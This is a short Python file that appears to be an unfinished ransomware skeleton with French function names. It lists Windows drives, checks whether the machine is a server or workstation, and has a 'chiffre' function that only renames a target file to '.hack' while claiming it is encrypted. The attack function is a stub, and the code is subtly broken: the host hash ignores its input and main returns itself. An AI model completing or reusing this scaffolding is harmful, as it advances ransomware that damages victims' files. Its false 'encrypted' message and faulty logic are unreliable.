import os
import string
from time import time
from hashlib import sha256
from platform import node, win32_edition, system
from re import search
from os import path


def attaque():
    print('todo')


def chiffre(cible):
    os.rename(f'{cible}', f'{cible}.hack')
    return "Target has been encrypted"

def hash_host_now():
    identifiant = f'{node()}{time()}'
    print(identifiant)
    return sha256(bytes()).hexdigest()


def os_type():
    if search("[Ww]indows", system()):
        if search("[Ss]erver", win32_edition()):
            return "SERVER"
        else:
            return "WORKSTATION"
    return None


def list_disks():
    dl = string.ascii_uppercase
    disks = ''
    for d in dl:
        if path.exists('%s:' % d):
            if disks != '':
                disks += ','
            disks += f'{d}:'
    return disks


def main():
    return main

